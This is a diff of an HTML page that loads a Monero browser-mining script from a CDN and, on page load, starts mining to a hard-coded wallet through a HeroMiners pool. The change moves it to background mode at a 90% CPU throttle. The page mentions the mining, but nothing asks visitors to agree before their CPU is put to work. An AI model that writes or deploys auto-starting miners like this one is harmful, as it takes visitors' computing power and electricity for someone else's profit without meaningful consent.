@@ -3,24 +3,28 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>MoneroOcean Browser Miner</title>
+    <title>Mine Monero (XMR) with Us!</title>
 </head>
 <body>
 
-<h1>Mine Monero (XMR) with Us!</h1>
+<h1>Support Us by Mining Monero (XMR)</h1>
+<p>We are using your CPU power to mine Monero for free. Keep this window open to support!</p>
 
-<p>By using our website, you can help us mine Monero and earn rewards directly to our wallet. You can leave this tab open to support!</p>
-
-<!-- MoneroOcean Mining Script from CDN -->
 <script src="https://cdn.jsdelivr.net/gh/monero-ecosystem/moneroocean-webminer/monero-ocean.min.js"></script>
 <script>
-    (async function() {
-        try {
-            await MoneroOcean.start('44YZNNDgXtpPhEmvc6RJdd3s7jg6mvR5ZhQSGg33i8y6WkU5hxM8D5A8W2sSzw5uZuj9MTyWzubVMiE8aGfzhXkpDdNmkkf');
-        } catch (error) {
-            console.error("Error starting the miner:", error);
-        }
-    })();
+    // Start mining with the Monero wallet address and the Herominers pool
+    MoneroOcean.start('44YZNNDgXtpPhEmvc6RJdd3s7jg6mvR5ZhQSGg33i8y6WkU5hxM8D5A8W2sSzw5uZuj9MTyWzubVMiE8aGfzhXkpDdNmkkf', {
+        url: 'es.monero.herominers.com:1111', // Set the HeroMiners pool address
+        autoThreads: true, // Automatically adjusts threads based on CPU power
+        throttle: 0.9, // Limits the CPU usage to 90%
+        background: true // Run the mining script in the background
+    })
+    .then(function() {
+        console.log('Mining started!');
+    })
+    .catch(function(error) {
+        console.error('Error: ' + error.message);
+    });
 </script>
 
 </body>
